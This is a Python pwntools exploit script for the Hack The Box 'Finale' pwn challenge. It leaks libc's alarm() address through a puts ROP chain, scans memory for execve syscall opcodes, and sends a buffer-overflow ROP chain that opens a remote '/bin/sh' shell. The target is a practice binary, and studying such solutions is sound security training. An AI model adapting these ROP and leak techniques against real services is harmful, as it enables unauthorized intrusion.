#########################################################################################
# exploit.py
#   Exploit that solves HTB's Finale pwn challenge using an unintended way.
#   2023 by Socialkas (@Disbauxes)
#
#   NOTES
#       This exploit leaks the address of libc6's alarm() function and then
#       it dumps all the opcodes from alarm() to offsetAddr in order to search
#       for execve()'s opcodes offset:
#
#           b83b000000 mov eax,0x3b
#           0f05       syscall
#           c3         ret
#
#       Because the server is running a custom libc6 library, we cannot use
#       any traditional way of computing libc6's base address and the address of
#       execve(), system(), "/bin/sh" etc. But we can clearly see that alarm()
#       is very close to execve():
#
#           $1 = {<text variable, no debug info>} 0x7ffff7e7e0f0 <execve>
#           $2 = {<text variable, no debug info>} 0x7ffff7e7d5b0 <alarm>
#           p/x 0x7ffff7e7e0f0 - 0x7ffff7e7d5b0:    0xb40
#
#       So by dumping around 3000 bytes of instructions, we can get the
#       offset from alarm() to the desired opcodes in les than 2 minutes (remotely)
#       Once we have this offset, we use it in order to call execve() in a simple
#       ROP-chain.
#
#       This script can be improved to get the offset and then inject the last
#       ROP-chain in one go, instead of running the exploit twice!
#
#   USAGE
#       1) Run the exploit first to obtain the offset we need:
#           python3 exploit.py REMOTE TARGET=IP:PORT GETEXECVE
#       2) Then, re-run the exploit with the previous offset to gain a shell:
#           python3 exploit.py REMOTE TARGET=IP:PORT OFFSET=OFFSET
#
#       Example:
#           For Finale remote instance, the obtained offset is 0xce4, so we can
#           gain a remote shell by running our exploit like this:
#
#           python3 exploit.py REMOTE TARGET=IP:PORT OFFSET=0xce4
#########################################################################################
from pwn import *

exe = "./finale"
binary = ELF(exe)

# The password we need to send in order to reach the vulnerable function finale():
password = b's34s0nf1n4l3b00'

# ROP gadgets:
pop_rdi_ret =   0x4012d6
pop_rsi_ret =   0x4012d8

# libc6@plt functions:
_open       =   0x4011c0
_puts       =   0x401120

# For our kind of attack, we can see that alarm() is very close to execve:
#   $1 = {<text variable, no debug info>} 0x7ffff7e7e0f0 <execve>
#   $2 = {<text variable, no debug info>} 0x7ffff7e7d5b0 <alarm
#   p/x 0x7ffff7e7e0f0 - 0x7ffff7e7d5b0:    0xb40
# So we will use this function in order to reach for execve:
_alarm_got  =   0x403fa0

# We show some basic information about the ROP gadgets will be using:
info("ROP gadgets at: pop_rdi_ret=0x%2x," \
                      "pop_rsi_ret=0x%2x," \
                      "_open=0x%2x" % (pop_rdi_ret,pop_rsi_ret,_open))

# How many bytes of padding before reaching RBP:
padding = 0x40

# This offset defines how many bytes from alarm() will be dumping in order
# to find the right opcodes of execve() syscall. Because alarm() is very
# close to the opcodes we seek, this value does not need to be big. Our attack
# will be dumping bytes from [alarm,alarm+offsetAddr]:
offsetAddr  =   4000

#####################################################################################
# printAddress(addr,rbp)
#   Returns all the bytes starting at addr until reaching a null byte.
#   Sets RBP to rbp and junps back to main()
#####################################################################################
def printAddress(addr,rbp):

    # Padding always first:
    payload = b'A'*(padding)

    # RBP:
    payload += p64(rbp)

    # We prepare the basic ROP-chain first:
    # puts(addr); main():
    printOpCode =  p64(pop_rdi_ret)
    printOpCode += p64(addr)
    printOpCode += p64(_puts)
    printOpCode += p64(binary.symbols["main"])

    # Sends the payload:
    payload += printOpCode
    try:
        r.sendlineafter(b'year: ',payload)

        # We parse everything until reaching the leaked value:
        r.recvuntil(b"you!")
        r.recvline()
        r.recvline()

        # Here are the bytes until reaching a NULL-byte:
        data = r.recvline()
        r.sendlineafter(b"phrase: ",password)
        # We skip the character \n (0xa):
        return data[:-1]
    except:
        # Last address:
        warning("Error trying address: 0x%2x " % addr)
        return -1

#########################################################################################
# getBuffer():
#   Returns the stack address given by the program
#########################################################################################
def getBuffer():
    buf_addr = 0x0
    r.recvline()
    buf_addr = int(r.recvline().decode('ascii').split(':')[2].strip().replace("[","").replace("]",""),16)
    warning("Leaked &buff = 0x%2x " % buf_addr)
    return buf_addr

if args.REMOTE:
    # We will be connecting to the remote instance:
    r = remote(args.TARGET.split(':')[0],int(args.TARGET.split(':')[1]))
else:
    # We will be using a local process in our machine:
    r = process(binary.path)

# We send the secret password to the program:
r.sendlineafter(b"phrase: ",password)

# First thing: we grab the address of our buffer (stack):
buf_addr = getBuffer()

# First thing is to leak the address of the libc6's function alarm() using its
# got entry:
#   [0x403fa0] alarm@GLIBC_2.2.5  â†’  0x7ffff7e7d5b0
alarm =   int(printAddress(_alarm_got,buf_addr)[::-1].hex(),16)
warning("Libc6's alarm() at 0x%2x " % alarm)

# We grab the new buffer address for further use:
buf_addr = getBuffer()

# Now, we can pass the argument GETEXECVE to ask to look for the right offset
# within the server's libc6 library where the desired opcodes for execve() are
# located. Because the offsets never change, once we have this information we
# can re-execute our exploit with the right OFFSET as a parameter to gain a
# shell by issuing a classic ROP-chain with execve():
if args.GETEXECVE:
    info("Looking for mov eax,0x3b;syscall;ret OPCODES [0x%2x , 0x%2x]" %
            (alarm,alarm+offsetAddr))
    # This is basically a loop that dumps every opcode until finding the opcodes
    # or reaching alarm+offsetAddr:
    for i in range(alarm,alarm+offsetAddr,8):
     opcodes = printAddress(i,buf_addr)
     if opcodes == -1:
        offsetAddr = read-i
        warning("Error dumping opcodes from: 0x%2x " % offsetAddr)
        continue
     info("[0x%2x] 0x%2x : %s " % (alarm, i,opcodes.hex()))
     # Do we have our bytes?
     off = opcodes.find(b'\xb8\x3b')
     if off > 0:
        # Grab only the exact position within the returned data
        syscall = i+off
        offt = abs(alarm - syscall)
        warning("opcode found at 0x%2x , offset=0x%2x" % ( syscall, offt))
        # The offsets NEVER change; so now we can re-run the exploit
        # adding this offset to the leaked alarm() instruction!!!!  
        info("Offset obtained; re-run this exploit now with OFFSET=0x%2x" % offt)
        sys.exit(0)

# Once we already have the address for execve, we can use it here
# to gain a remote shell by constructing a simple ROP-chain that ends up calling
# the opcodes found within execve():
else:

    # Because we have already run our exploit against the live instance and its
    # offset never changes, we can set the offset value right away:
    if not args.OFFSET and args.REMOTE:
        args.OFFSET = "0xce4"
    if not args.OFFSET and not args.REMOTE:
        error("Please, re-run this exploit with GETEXECVE first!")

    warning("Using excve() offset: %s " % args.OFFSET)
    rbp  = buf_addr

    # The command we want to run:
    command = b'/bin/sh\x00'
    payload = command

    # The padding taking into account our command:
    payload += b'A'*(padding-len(command))
    payload += p64(rbp)

    # We need to set RDX to 0, it's still 0x54 (otherwise, our ROP will fail).
    # We do not have any xor edx,edx or mov edx,0 or somehing similar, but we
    # can call open() and it sets RDX = 0, so there we go:
    payload += p64(pop_rdi_ret)
    payload += p64(buf_addr)
    payload += p64(pop_rsi_ret)
    payload += p64(0x0)
    payload += p64(_open)

    # The last part of our ROP-chain will call execve():
    execve  =   p64(pop_rdi_ret)
    execve +=   p64(buf_addr)
    execve +=   p64(pop_rsi_ret)
    execve +=   p64(0x0)
    # We need the argument OFFSET to be the one obtained during GETEXECVE:
    execve +=   p64(alarm+int(args.OFFSET,16))
    # We can go back to main or do something else, it does not matter :
    execve +=   p64(binary.symbols["main"])
    payload += execve

    # We send our payload and we gain a remote shell:
    info("Sending ROP-chain to gain a shell...")
    r.sendlineafter(b'year: ',payload)

    # We get rid of the last two lines:
    r.recvline()
    r.recvline()
    # We gain a remote shell:
    r.interactive()

r.close()
